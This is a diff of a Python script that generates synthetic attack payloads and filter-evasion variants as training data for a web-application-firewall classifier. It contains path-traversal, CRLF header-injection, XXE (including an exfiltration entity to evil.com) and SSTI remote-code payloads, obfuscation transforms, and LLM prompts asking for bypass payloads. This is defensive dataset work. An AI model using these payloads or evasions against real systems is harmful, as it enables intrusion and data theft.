@@ -7,7 +7,7 @@ Merges: 01_encoding_mutations, 02_tamper_scripts, 03–06_grammar_*, 07_local_ll
 
 Architecture:
   - Reads taxonomy_inventory.json → computes per-class gap → only generates what's needed
-  - Unified Generator registry: Mutator | Tamper | Grammar | LocalLLM (all subclass BaseGenerator)
+  - Unified Generator registry: Mutator | Tamper | Grammar | LLM (all subclass BaseGenerator)
   - Probabilistic mutation CHAINS: Grammar → Tamper → Encode (not one-shot)
   - Schema-validated output via HttpRecord Pydantic model before Parquet write
   - ThreadPoolExecutor for parallel class generation
@@ -22,6 +22,7 @@ import argparse
 import json
 import random
 import re
+import time
 import urllib.parse
 import uuid
 from abc import ABC, abstractmethod
@@ -31,11 +32,15 @@ from pathlib import Path
 from typing import Callable
 
 import pyarrow.parquet as pq
+from rich.progress import Progress, SpinnerColumn, BarColumn, MofNCompleteColumn, TimeElapsedColumn
 
 from ai_waf_v2.data.schema import HttpRecord, records_to_table
 from ai_waf_v2.utils.config import load_config
+from ai_waf_v2.utils.llm import call_llm
 from ai_waf_v2.utils.logging import configure_root, get_logger
+from ai_waf_v2.utils.pipeline import require_inputs, check_output
 from ai_waf_v2.utils.seed import seed_everything
+from ai_waf_v2.utils.timing import StepTimer
 
 log = get_logger(__name__)
 
@@ -158,6 +163,88 @@ GRAMMAR_REGISTRY: dict[str, AttackGrammar] = {
                    "/api/v1/run", "/debug/exec", "/api/shell"],
         methods=["GET", "POST"],
     ),
+    "path_traversal": AttackGrammar(
+        name="path_traversal",
+        prefixes=["", "../", "..\\", "....//", "%2e%2e/", "%2e%2e%2f", "..%2f", "..%5c"],
+        payloads=[
+            "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
+            "../../../../etc/shadow", "../../../proc/self/environ",
+            "..\\..\\..\\windows\\win.ini",
+            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+            "%2e%2e%2fetc%2fpasswd", "%2e%2e/%2e%2e/etc/passwd",
+            "..%2f..%2f..%2fetc%2fpasswd", "..%252f..%252fetc%252fpasswd",
+            "..%c0%af..%c0%afetc%c0%afpasswd", "..%e0%80%afetc%e0%80%afpasswd",
+            "....//....//etc/passwd", "....\\\\....\\\\etc\\passwd",
+        ],
+        suffixes=["%00", "%00.php", "", ".txt", "%20"],
+        params=["path", "file", "dir", "filename", "filepath", "document", "resource"],
+        endpoints=["/download", "/files", "/static", "/assets",
+                   "/api/v1/file", "/api/download", "/serve"],
+        methods=["GET"],
+    ),
+    "header_injection": AttackGrammar(
+        name="header_injection",
+        prefixes=["", "%0d%0a", "%0a", "\r\n", "\n"],
+        payloads=[
+            "%0d%0aSet-Cookie: session=evil",
+            "%0d%0aLocation: https://evil.com",
+            "%0d%0aContent-Type: text/html\r\n\r\n<script>alert(1)</script>",
+            "\r\nSet-Cookie: admin=true",
+            "\r\nX-Forwarded-For: 127.0.0.1",
+            "%0aSet-Cookie: role=admin",
+            "%0d%0aContent-Length: 0%0d%0aHTTP/1.1 200 OK",
+            "\r\nLocation: //evil.com",
+            "%0d%0aX-Frame-Options: ALLOWALL",
+            "%0d%0aAccess-Control-Allow-Origin: *",
+        ],
+        suffixes=["", "%0d%0a", "&"],
+        params=["redirect", "url", "next", "location", "return", "returnUrl", "callback"],
+        endpoints=["/redirect", "/login", "/api/v1/redirect",
+                   "/auth/callback", "/oauth/authorize"],
+        methods=["GET", "POST"],
+    ),
+    "xxe": AttackGrammar(
+        name="xxe",
+        prefixes=[
+            '<?xml version="1.0"?>',
+            '<?xml version="1.0" encoding="UTF-8"?>',
+        ],
+        payloads=[
+            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
+            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
+            '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]><foo/>',
+            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
+            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
+            '<!DOCTYPE foo PUBLIC "-//OWASP//DTD//EN" "http://evil.com/evil.dtd"><foo/>',
+            '<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://evil.com/?x=%file;\'>"> %eval; %exfil;]><data/>',
+        ],
+        suffixes=[""],
+        params=["data", "xml", "body", "payload", "content"],
+        endpoints=["/api/v1/xml", "/api/upload", "/api/parse",
+                   "/soap", "/api/v1/data", "/xmlrpc"],
+        methods=["POST"],
+    ),
+    "ssti": AttackGrammar(
+        name="ssti",
+        prefixes=["", "'", '"', "}}{{"],
+        payloads=[
+            "{{7*7}}", "{{7*'7'}}", "{{config}}", "{{config.items()}}",
+            "${7*7}", "${class.getResource('').getPath()}",
+            "#{7*7}", "#{session.getAttribute('admin')}",
+            "{{''.__class__.__mro__[2].__subclasses__()}}",
+            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+            "{{lipsum.__globals__['os'].popen('id').read()}}",
+            "<%= 7*7 %>", "<%= system('id') %>",
+            "{php}echo(`id`);{/php}",
+            "*{7*7}", "@(1+2)",
+        ],
+        suffixes=["", "}}", "%}", "-->"],
+        params=["name", "template", "subject", "greeting", "message", "title", "content"],
+        endpoints=["/render", "/template", "/api/v1/render",
+                   "/email/preview", "/api/v1/template", "/preview"],
+        methods=["GET", "POST"],
+    ),
 }
 
 
@@ -198,8 +285,8 @@ class GrammarGenerator(BaseGenerator):
         return payloads
 
 
-class MutatorGenerator(BaseGenerator):
-    """Applies encoding mutations to seed payloads loaded from the train split."""
+class EncoderGenerator(BaseGenerator):
+    """Applies encoding mutations to payload strings (URL, hex, unicode, case, whitespace)."""
 
     ENCODINGS: dict[str, Callable[[str, random.Random], str]] = {
         "url_encode":        lambda s, r: urllib.parse.quote(s, safe=""),
@@ -234,7 +321,7 @@ class MutatorGenerator(BaseGenerator):
 
     @property
     def name(self) -> str:
-        return "mutator"
+        return "encoder"
 
     def generate_payloads(self, attack_class: str, n: int, rng: random.Random) -> list[str]:
         if not self.seeds:
@@ -248,17 +335,79 @@ class MutatorGenerator(BaseGenerator):
         return payloads
 
 
-class TamperGenerator(BaseGenerator):
-    """Applies sqlmap-style tamper transforms to seed payloads."""
+# ─── IP-address helpers for SSRF obfuscation ────────────────────────────────
 
-    TAMPERS: dict[str, Callable[[str], str]] = {
-        "apostrophe_mask":  lambda s: s.replace("'", "UTF8MB4_UNICODE_CI"),
-        "modsecurity_safe": lambda s: s.replace("=", " LIKE ").replace("OR", "||"),
-        "between":          lambda s: s.replace("=1", " BETWEEN 0 AND 2"),
-        "ifnull2ifisnull":  lambda s: s.replace("IFNULL(", "IF(ISNULL("),
-        "multiplespaces":   lambda s: s.replace(" ", "   "),
-        "space2dash":       lambda s: s.replace(" ", "--\n"),
-        "space2mssqlblank": lambda s: s.replace(" ", "\\t"),
+_IPV4_RE = re.compile(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b')
+
+
+def _ip_to_decimal(s: str) -> str:
+    def _conv(m: re.Match) -> str:
+        parts = m.group(1).split(".")
+        return str(sum(int(p) << (24 - 8 * i) for i, p in enumerate(parts)))
+    return _IPV4_RE.sub(_conv, s)
+
+
+def _ip_to_octal(s: str) -> str:
+    def _conv(m: re.Match) -> str:
+        return ".".join(oct(int(p)).replace("0o", "0") for p in m.group(1).split("."))
+    return _IPV4_RE.sub(_conv, s)
+
+
+def _ip_to_hex(s: str) -> str:
+    def _conv(m: re.Match) -> str:
+        return "0x" + "".join(f"{int(p):02x}" for p in m.group(1).split("."))
+    return _IPV4_RE.sub(_conv, s)
+
+
+class ObfuscatorGenerator(BaseGenerator):
+    """Applies class-specific syntax obfuscation transforms to seed payloads."""
+
+    OBFUSCATORS: dict[str, dict[str, Callable[[str], str]]] = {
+        "sqli": {
+            "apostrophe_mask":  lambda s: s.replace("'", "UTF8MB4_UNICODE_CI"),
+            "modsecurity_safe": lambda s: s.replace("=", " LIKE ").replace("OR", "||"),
+            "between":          lambda s: s.replace("=1", " BETWEEN 0 AND 2"),
+            "ifnull2ifisnull":  lambda s: s.replace("IFNULL(", "IF(ISNULL("),
+            "multiplespaces":   lambda s: s.replace(" ", "   "),
+            "space2dash":       lambda s: s.replace(" ", "--\n"),
+            "space2mssqlblank": lambda s: s.replace(" ", "\t"),
+        },
+        "xss": {
+            "tag_case":          lambda s: s.replace("<script", "<Script").replace("<img", "<Img").replace("<svg", "<Svg"),
+            "js_comment":        lambda s: s.replace("alert(", "alert/*xss*/("),
+            "backtick_exec":     lambda s: s.replace("alert(1)", "alert`1`"),
+            "attr_double_encode":lambda s: s.replace("alert", "&#x61;lert"),
+            "null_byte_event":   lambda s: s.replace("onerror=", "on\x00error=").replace("onload=", "on\x00load="),
+        },
+        "lfi": {
+            "double_encode": lambda s: s.replace("../", "%252e%252e%252f"),
+            "overlong_utf8": lambda s: s.replace("../", "%c0%ae%c0%ae/"),
+            "dotdotslash":   lambda s: s.replace("../", "....//"),
+            "null_byte":     lambda s: s + "%00",
+            "backslash_mix": lambda s: s.replace("../", "..\\"),
+        },
+        "cmdi": {
+            "ifs_space":    lambda s: s.replace(" ", "${IFS}"),
+            "brace_expand": lambda s: re.sub(r'\b(cat|ls|id|whoami|uname|wget|curl)\b', r'{\1,}', s),
+            "quote_break":  lambda s: re.sub(r'\b([a-z])([a-z]+)\b', r"\1''\2", s, count=1),
+            "hex_cmd":      lambda s: s.replace("cat", "$'\\x63\\x61\\x74'").replace("id", "$'\\x69\\x64'"),
+        },
+        "ssrf": {
+            "ip_decimal":      _ip_to_decimal,
+            "ip_octal":        _ip_to_octal,
+            "ip_hex":          _ip_to_hex,
+            "proto_confusion": lambda s: s.replace("http://", "http:///"),
+            "ipv6_mapped":     lambda s: s.replace("127.0.0.1", "[::ffff:127.0.0.1]").replace("169.254.169.254", "[::ffff:169.254.169.254]"),
+        },
+    }
+
+    # Safe second-pass transforms per class: operate on different payload parts
+    # than the primary obfuscations so stacking doesn't produce conflicts or no-ops.
+    #   lfi  — null_byte appends to suffix; safe after any traversal transform
+    #   ssrf — proto_confusion rewrites the scheme; safe after any IP transform
+    STACKABLE: dict[str, list[str]] = {
+        "lfi":  ["null_byte"],
+        "ssrf": ["proto_confusion"],
     }
 
     def __init__(self, seeds: list[str]):
@@ -266,70 +415,187 @@ class TamperGenerator(BaseGenerator):
 
     @property
     def name(self) -> str:
-        return "tamper"
+        return "obfuscator"
+
+    def apply_stackable(self, payload: str, attack_class: str, rng: random.Random) -> str:
+        """Apply a safe secondary obfuscation for classes with known compatible stacks."""
+        names = self.STACKABLE.get(attack_class, [])
+        if not names:
+            return payload
+        fn = self.OBFUSCATORS[attack_class][rng.choice(names)]
+        return fn(payload)
 
     def generate_payloads(self, attack_class: str, n: int, rng: random.Random) -> list[str]:
         if not self.seeds:
             return []
-        tamper_fns = list(self.TAMPERS.values())
-        payloads   = []
+        class_transforms = self.OBFUSCATORS.get(attack_class, {})
+        if not class_transforms:
+            return []
+        transform_fns = list(class_transforms.values())
+        payloads      = []
         for _ in range(n):
             seed = rng.choice(self.seeds)
-            fn   = rng.choice(tamper_fns)
+            fn   = rng.choice(transform_fns)
             payloads.append(fn(seed))
         return payloads
 
 
-class LocalLLMGenerator(BaseGenerator):
-    """Generates payloads via a locally-hosted GGUF model (offline, no API key)."""
+def _parse_payload_response(text: str) -> list[str]:
+    """
+    Parse an LLM response into a list of payload strings.
+    Expects a JSON array; falls back to line-by-line parsing if JSON is malformed.
+    """
+    import json as _json
+    # Strip markdown code fences if present
+    if text.startswith("```"):
+        text = "\n".join(l for l in text.splitlines() if not l.strip().startswith("```"))
+    text = text.strip()
+    try:
+        parsed = _json.loads(text)
+        if isinstance(parsed, list):
+            return [str(p).strip() for p in parsed if str(p).strip()]
+    except (_json.JSONDecodeError, ValueError):
+        pass
+    # Fallback: one payload per line, strip list prefixes ("1.", "-", "*")
+    results = []
+    for line in text.splitlines():
+        line = line.strip()
+        if not line or len(line) <= 3 or line.endswith(":"):
+            continue
+        # Remove common list prefixes
+        for prefix in ("- ", "* ", "• "):
+            if line.startswith(prefix):
+                line = line[len(prefix):]
+                break
+        if line and line[0].isdigit() and ". " in line[:4]:
+            line = line.split(". ", 1)[1]
+        if line:
+            results.append(line)
+    return results
+
+
+class LlmGenerator(BaseGenerator):
+    """Generates payloads via a configurable LLM backend (local, Ollama, Anthropic, Google)."""
+
+    SYSTEM = (
+        "You are a security dataset generator for WAF classifier training. "
+        "Output ONLY a JSON array of payload strings — no markdown, no explanation, no commentary. "
+        'Example format: ["payload1", "payload2", "payload3"]'
+    )
+
+    BATCH_SIZE = 10  # payloads requested per model call
 
     PROMPTS = {
-        "sqli":  "Generate 5 novel SQL injection payloads evading keyword filters (blind, error-based, second-order). One per line.",
-        "xss":   "Generate 5 XSS payloads bypassing CSP/WAF (DOM-based, mutation, polyglot). One per line.",
-        "ssrf":  "Generate 5 SSRF payloads targeting cloud metadata (IP encoding, protocol wrappers). One per line.",
-        "cmdi":  "Generate 5 OS command injection payloads bypassing sanitization (metacharacters, env vars, encoding). One per line.",
-        "lfi":   "Generate 5 LFI payloads (null-byte, encoding tricks, PHP wrappers). One per line.",
+        "sqli": (
+            "Generate {n} SQL injection payloads for a WAF training dataset. "
+            "Cover blind, error-based, and second-order techniques with keyword-filter evasion. "
+            "Output a JSON array of exactly {n} payload strings."
+        ),
+        "xss": (
+            "Generate {n} XSS payloads for a WAF training dataset. "
+            "Cover DOM-based, mutation-based, and polyglot variants that bypass CSP. "
+            "Output a JSON array of exactly {n} payload strings."
+        ),
+        "ssrf": (
+            "Generate {n} SSRF payloads for a WAF training dataset. "
+            "Target cloud metadata endpoints using IP encoding and protocol wrappers. "
+            "Output a JSON array of exactly {n} payload strings."
+        ),
+        "cmdi": (
+            "Generate {n} OS command injection payloads for a WAF training dataset. "
+            "Use metacharacters, environment variables, and encoding to bypass sanitization. "
+            "Output a JSON array of exactly {n} payload strings."
+        ),
+        "lfi": (
+            "Generate {n} LFI payloads for a WAF training dataset. "
+            "Use null-byte injection, encoding tricks, and PHP wrappers. "
+            "Output a JSON array of exactly {n} payload strings."
+        ),
+        "path_traversal": (
+            "Generate {n} path traversal payloads for a WAF training dataset. "
+            "Use Unicode encoding, double encoding, Windows paths, and null bytes to bypass filters. "
+            "Output a JSON array of exactly {n} payload strings."
+        ),
+        "header_injection": (
+            "Generate {n} HTTP header injection payloads for a WAF training dataset. "
+            "Use CRLF sequences to inject Set-Cookie or Location headers, in both URL-encoded and raw forms. "
+            "Output a JSON array of exactly {n} payload strings."
+        ),
+        "xxe": (
+            "Generate {n} XXE payloads for a WAF training dataset. "
+            "Each must be a complete XML document with DOCTYPE and ENTITY declarations for local file read or SSRF. "
+            "Output a JSON array of exactly {n} payload strings."
+        ),
+        "ssti": (
+            "Generate {n} server-side template injection payloads for a WAF training dataset. "
+            "Cover Jinja2, Twig, FreeMarker, and Velocity engines including RCE variants. "
+            "Output a JSON array of exactly {n} payload strings."
+        ),
     }
 
-    def __init__(self, model_path: str, max_new_tokens: int = 256):
-        self._model_path    = model_path
-        self._max_new_tokens = max_new_tokens
-        self._llm           = None
-
-    def _lazy_load(self):
-        if self._llm is None:
-            try:
-                from llama_cpp import Llama
-                self._llm = Llama(
-                    model_path=self._model_path,
-                    n_ctx=512, n_gpu_layers=-1, verbose=False,
-                )
-                log.info(f"LocalLLMGenerator: model loaded from {self._model_path}")
-            except ImportError:
-                raise ImportError(
-                    "llama-cpp-python not installed. "
-                    "pip install llama-cpp-python --extra-index-url "
-                    "https://abetlen.github.io/llama-cpp-python/whl/cu124"
-                )
+    def __init__(
+        self,
+        provider:         str,
+        model:            str   = "",
+        model_path:       str   = "",
+        ollama_base_url:  str   = "http://localhost:11434",
+        max_tokens:       int   = 256,
+        temperature:      float = 0.9,
+        request_timeout:  int   = 30,
+    ):
+        self._provider        = provider
+        self._model           = model
+        self._model_path      = model_path
+        self._ollama_base_url = ollama_base_url
+        self._max_tokens      = max_tokens
+        self._temperature     = temperature
+        self._request_timeout = request_timeout
 
     @property
     def name(self) -> str:
-        return "local_llm"
+        return "llm"
 
     def generate_payloads(self, attack_class: str, n: int, rng: random.Random) -> list[str]:
-        self._lazy_load()
         prompt = self.PROMPTS.get(attack_class)
         if not prompt:
             return []
+        MAX_CONSECUTIVE_FAILURES = 5
         payloads: list[str] = []
+        consecutive_failures = 0
         while len(payloads) < n:
-            resp  = self._llm(f"[INST] {prompt} [/INST]",
-                              max_tokens=self._max_new_tokens,
-                              temperature=0.9, top_p=0.95,
-                              stop=["\n\n", "###"])
-            lines = [l.strip() for l in resp["choices"][0]["text"].splitlines()
-                     if l.strip() and len(l.strip()) > 3 and not l.strip().endswith(":")]
-            payloads.extend(lines)
+            batch = min(self.BATCH_SIZE, n - len(payloads))
+            log.info(f"[{attack_class}] calling LLM — {len(payloads)}/{n} payloads so far")
+            text = call_llm(
+                provider         = self._provider,
+                system           = self.SYSTEM,
+                user             = prompt.format(n=batch),
+                model            = self._model,
+                max_tokens       = self._max_tokens,
+                temperature      = self._temperature,
+                model_path       = self._model_path,
+                ollama_base_url  = self._ollama_base_url,
+                request_timeout  = self._request_timeout,
+            )
+            if text:
+                before = len(payloads)
+                payloads.extend(_parse_payload_response(text))
+                if len(payloads) > before:
+                    consecutive_failures = 0
+                    log.info(f"[{attack_class}] {len(payloads)}/{n} payloads collected")
+                else:
+                    consecutive_failures += 1
+                    log.warning(f"[{attack_class}] response yielded no payloads ({consecutive_failures}/{MAX_CONSECUTIVE_FAILURES})")
+            else:
+                consecutive_failures += 1
+                log.warning(f"[{attack_class}] call_llm returned None ({consecutive_failures}/{MAX_CONSECUTIVE_FAILURES})")
+                time.sleep(1.0)
+
+            if consecutive_failures >= MAX_CONSECUTIVE_FAILURES:
+                log.warning(
+                    f"[{attack_class}] aborting LLM generation after {MAX_CONSECUTIVE_FAILURES} "
+                    f"consecutive failures — returning {len(payloads)}/{n} payloads"
+                )
+                break
         return payloads[:n]
 
 
@@ -338,41 +604,47 @@ class LocalLLMGenerator(BaseGenerator):
 # ─────────────────────────────────────────────────────────────────────────────
 
 def _build_chain(
-    payload:    str,
-    generators: list[BaseGenerator],
-    chain_len:  int,
-    attack_class: str,
-    rng:        random.Random,
+    payload:              str,
+    generators:           list[BaseGenerator],
+    chain_len:            int,
+    attack_class:         str,
+    rng:                  random.Random,
+    double_encode_prob:   float = 0.30,
+    double_obfuscate_prob: float = 0.30,
 ) -> str:
     """
-    Probabilistic mutation chain.
-
-    Randomly selects `chain_len` generators from the available pool and applies
-    them sequentially so that a single seed is Grammar → Tamper → Encode in one
-    pass rather than one-shot transformations.
+    Deterministic transform chain applied to every seed payload:
+      1. Obfuscator        — syntax-level, class-specific
+      2. Obfuscator again  — stackable second pass with probability `double_obfuscate_prob`
+                             (lfi: null_byte suffix; ssrf: proto_confusion scheme rewrite)
+      3. Encoder           — encoding-level, always applied
+      4. Encoder again     — with probability `double_encode_prob` for double-encoded variants
     """
-    pool = [g for g in generators if g.name in ("mutator", "tamper")]
-    if not pool:
-        return payload
+    obfuscator = next((g for g in generators if g.name == "obfuscator"), None)
+    encoder    = next((g for g in generators if g.name == "encoder"),    None)
 
-    steps = rng.choices(pool, k=min(chain_len, len(pool)))
     result = payload
-    for gen in steps:
-        candidates = gen.generate_payloads(attack_class, 1, rng)
-        if candidates:
-            # Apply the generator as a transform on the current result
-            result = candidates[0] if gen.name == "grammar" else _apply_to_string(gen, result, rng)
+    if obfuscator:
+        result = _apply_to_string(obfuscator, result, attack_class, rng)
+        if rng.random() < double_obfuscate_prob:
+            result = obfuscator.apply_stackable(result, attack_class, rng)
+    if encoder:
+        result = _apply_to_string(encoder, result, attack_class, rng)
+        if rng.random() < double_encode_prob:
+            result = _apply_to_string(encoder, result, attack_class, rng)
     return result
 
 
-def _apply_to_string(gen: BaseGenerator, payload: str, rng: random.Random) -> str:
-    """Apply a single Mutator/Tamper generator to an existing payload string."""
-    if isinstance(gen, MutatorGenerator):
+def _apply_to_string(gen: BaseGenerator, payload: str, attack_class: str, rng: random.Random) -> str:
+    """Apply a single Encoder/Obfuscator generator to an existing payload string."""
+    if isinstance(gen, EncoderGenerator):
         enc_key = rng.choice(gen.enabled)
-        return MutatorGenerator.ENCODINGS[enc_key](payload, rng)
-    if isinstance(gen, TamperGenerator):
-        fn = rng.choice(list(TamperGenerator.TAMPERS.values()))
-        return fn(payload)
+        return EncoderGenerator.ENCODINGS[enc_key](payload, rng)
+    if isinstance(gen, ObfuscatorGenerator):
+        class_transforms = ObfuscatorGenerator.OBFUSCATORS.get(attack_class, {})
+        if class_transforms:
+            fn = rng.choice(list(class_transforms.values()))
+            return fn(payload)
     return payload
 
 
@@ -388,16 +660,20 @@ class AugmentationGovernor:
 
     def __init__(
         self,
-        inventory_path: Path,
-        target_per_class: int,
-        generators: list[BaseGenerator],
-        chain_len: int = 2,
-        rng_seed: int = 42,
+        inventory_path:        Path,
+        target_per_class:      int,
+        generators:            list[BaseGenerator],
+        chain_len:             int   = 2,
+        double_encode_prob:    float = 0.30,
+        double_obfuscate_prob: float = 0.30,
+        rng_seed:              int   = 42,
     ):
-        self.target          = target_per_class
-        self.generators      = generators
-        self.chain_len       = chain_len
-        self.rng             = random.Random(rng_seed)
+        self.target                = target_per_class
+        self.generators            = generators
+        self.chain_len             = chain_len
+        self.double_encode_prob    = double_encode_prob
+        self.double_obfuscate_prob = double_obfuscate_prob
+        self.rng                   = random.Random(rng_seed)
 
         self.class_counts: dict[str, int] = {}
         if inventory_path.exists():
@@ -427,35 +703,40 @@ class AugmentationGovernor:
         self,
         attack_class: str,
         n_needed:    int,
-    ) -> list[str]:
+    ) -> list[tuple[str, str]]:
         """
-        Generate `n_needed` payload strings for `attack_class` by distributing
-        the load across all registered generators and applying mutation chains.
+        Generate `n_needed` payload strings for `attack_class`.
+
+        Returns a list of (payload, generator_name) pairs so callers can
+        tag records with their origin (grammar vs llm).
+
+        Seed producers (grammar, llm) generate raw payloads; transform
+        generators (encoder, obfuscator) are applied to every seed via
+        _build_chain — never used as seed producers themselves.
         """
-        grammar_gens = [g for g in self.generators if g.name == "grammar"]
-        other_gens   = [g for g in self.generators if g.name != "grammar"]
+        seed_gens = [g for g in self.generators if g.name in ("grammar", "llm")]
+        if not seed_gens:
+            log.warning(f"No seed generators available for '{attack_class}'")
+            return []
 
-        # Split: 40% grammar seeds, then mutated/tampered
-        n_grammar = int(n_needed * 0.40)
-        n_chains  = n_needed - n_grammar
+        per_gen = max(1, -(-n_needed // len(seed_gens)))  # ceiling division
+        raw_seeds: list[tuple[str, str]] = []  # (payload, generator_name)
+        for g in seed_gens:
+            raw_seeds.extend(
+                (p, g.name) for p in g.generate_payloads(attack_class, per_gen, self.rng)
+            )
 
-        # Step 1: grammar baseline payloads
-        raw_seeds: list[str] = []
-        for g in grammar_gens:
-            raw_seeds.extend(g.generate_payloads(attack_class, n_grammar, self.rng))
+        # Pad with random duplicates if a generator fell short (e.g. LLM failures)
+        while len(raw_seeds) < n_needed:
+            raw_seeds.append(self.rng.choice(raw_seeds))
 
-        # Step 2: non-grammar generators top-up (mutator, tamper, local_llm)
-        if other_gens and raw_seeds:
-            per_gen = max(1, n_chains // len(other_gens))
-            for g in other_gens:
-                raw_seeds.extend(g.generate_payloads(attack_class, per_gen, self.rng))
-
-        # Step 3: apply probabilistic chains to produce final payloads
         final_payloads = []
-        for seed in raw_seeds[:n_needed]:
-            chained = _build_chain(seed, self.generators, self.chain_len, attack_class, self.rng)
-            final_payloads.append(chained)
-
+        for seed, gen_name in raw_seeds[:n_needed]:
+            final_payloads.append((
+                _build_chain(seed, self.generators, self.chain_len, attack_class, self.rng,
+                             self.double_encode_prob, self.double_obfuscate_prob),
+                gen_name,
+            ))
         return final_payloads[:n_needed]
 
 
@@ -463,19 +744,21 @@ class AugmentationGovernor:
 # HTTP record assembly (raw payload → validated HttpRecord)
 # ─────────────────────────────────────────────────────────────────────────────
 
-_UA_POOL = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
-    "curl/7.88.1", "python-requests/2.28.2", "sqlmap/1.7",
-]
+# Minimal stub headers used during synthesis — method/param/endpoint are
+# class-correct but all other metadata is a placeholder replaced by
+# 02_request_framing.py which handles realistic header diversity.
+_STUB_HEADERS = json.dumps({"Host": "stub.invalid", "User-Agent": "stub"})
 
 _CLASS_META = {
-    "sqli":  dict(method="GET",  param="q",    endpoint="/api/v1/search"),
-    "xss":   dict(method="POST", param="msg",  endpoint="/api/v1/comment"),
-    "ssrf":  dict(method="GET",  param="url",  endpoint="/api/v1/fetch"),
-    "cmdi":  dict(method="POST", param="host", endpoint="/api/v1/ping"),
-    "lfi":   dict(method="GET",  param="path", endpoint="/api/v1/file"),
+    "sqli":            dict(method="GET",  param="q",        endpoint="/api/v1/search"),
+    "xss":             dict(method="POST", param="msg",       endpoint="/api/v1/comment"),
+    "ssrf":            dict(method="GET",  param="url",       endpoint="/api/v1/fetch"),
+    "cmdi":            dict(method="POST", param="host",      endpoint="/api/v1/ping"),
+    "lfi":             dict(method="GET",  param="path",      endpoint="/api/v1/file"),
+    "path_traversal":  dict(method="GET",  param="file",      endpoint="/download"),
+    "header_injection":dict(method="GET",  param="redirect",  endpoint="/api/v1/redirect"),
+    "xxe":             dict(method="POST", param="",          endpoint="/api/v1/xml", raw_body=True),
+    "ssti":            dict(method="GET",  param="template",  endpoint="/api/v1/render"),
 }
 
 
@@ -483,32 +766,28 @@ def _payload_to_record(
     payload:      str,
     attack_class: str,
     source:       str,
-    rng:          random.Random,
 ) -> HttpRecord | None:
     """
-    Wrap a raw payload string in a realistic HTTP envelope and validate it
-    against the HttpRecord Pydantic schema before returning.
+    Wrap a raw payload in a minimal but schema-valid HTTP envelope.
 
-    Returns None if schema validation fails (prevents broken-pipe errors
-    in the training stage from malformed records reaching Parquet).
+    Method, param, and endpoint are class-correct; all other metadata is a
+    stub placeholder replaced by 02_request_framing.py.
+    Returns None if schema validation fails.
     """
     meta     = _CLASS_META.get(attack_class, dict(method="GET", param="input", endpoint="/api/data"))
     method   = meta["method"]
-    param    = meta["param"]
+    param    = meta.get("param", "input")
     endpoint = meta["endpoint"]
-    ua       = rng.choice(_UA_POOL)
+    raw_body = meta.get("raw_body", False)
 
-    if method == "GET":
+    if raw_body:
+        qs, body = "", payload
+    elif method == "GET":
         qs, body = f"{param}={payload}", ""
     else:
         qs, body = "", f"{param}={payload}"
 
-    headers = json.dumps({
-        "Host":         "target.example.com",
-        "User-Agent":   ua,
-        "Accept":       "text/html,application/json,*/*",
-        "Content-Type": "application/x-www-form-urlencoded" if body else "",
-    })
+    headers = _STUB_HEADERS
 
     try:
         record = HttpRecord(
@@ -547,9 +826,20 @@ def run(args: argparse.Namespace) -> None:
     cfg = load_config(args.config)
     seed_everything(cfg.project.seed)
 
-    aug_cfg  = cfg.augmentation
-    target   = getattr(aug_cfg, "target_per_class", TARGET_SAMPLES_PER_CLASS)
-    chain_len = getattr(aug_cfg, "chain_length", 2)
+    require_inputs({
+        "data/splits/train.parquet": "make baselines",
+    })
+    if check_output(
+        Path(cfg.paths.data_augmented) / "synthesis" / "synthesized_attacks.parquet",
+        args.force, "Stage 3.1 attack synthesis"
+    ):
+        return
+
+    aug_cfg               = cfg.augmentation
+    target                = getattr(aug_cfg, "target_per_class", TARGET_SAMPLES_PER_CLASS)
+    chain_len             = getattr(aug_cfg, "chain_length", 2)
+    double_encode_prob    = getattr(aug_cfg, "double_encode_prob",    0.30)
+    double_obfuscate_prob = getattr(aug_cfg, "double_obfuscate_prob", 0.30)
 
     splits_dir     = Path(cfg.paths.data_splits)
     inventory_path = Path(cfg.paths.reports) / "metrics" / "taxonomy_inventory.json"
@@ -560,72 +850,104 @@ def run(args: argparse.Namespace) -> None:
     seeds      = _load_seed_payloads(splits_dir)
     generators: list[BaseGenerator] = [
         GrammarGenerator(),
-        MutatorGenerator(seeds, enabled=aug_cfg.rules.encodings if hasattr(aug_cfg, "rules") else None),
-        TamperGenerator(seeds),
+        EncoderGenerator(seeds, enabled=aug_cfg.rules.encodings if hasattr(aug_cfg, "rules") else None),
+        ObfuscatorGenerator(seeds),
     ]
 
-    model_path = args.model_path or getattr(getattr(aug_cfg, "local_llm", None), "model_path", None)
-    if model_path and Path(model_path).exists():
-        generators.append(LocalLLMGenerator(model_path, getattr(aug_cfg.local_llm, "max_new_tokens", 256)))
-        log.info(f"LocalLLMGenerator enabled: {model_path}")
+    llm_cfg    = aug_cfg.llm
+    model_path = args.model_path or llm_cfg.model_path  # CLI flag overrides config for local
+    enabled    = llm_cfg.provider and (
+        llm_cfg.provider != "local" or (model_path and Path(model_path).exists())
+    )
+    if enabled:
+        generators.append(LlmGenerator(
+            provider        = llm_cfg.provider,
+            model           = llm_cfg.model,
+            model_path      = model_path,
+            ollama_base_url = llm_cfg.ollama_base_url,
+            max_tokens      = llm_cfg.max_tokens,
+            temperature     = llm_cfg.temperature,
+            request_timeout = llm_cfg.request_timeout,
+        ))
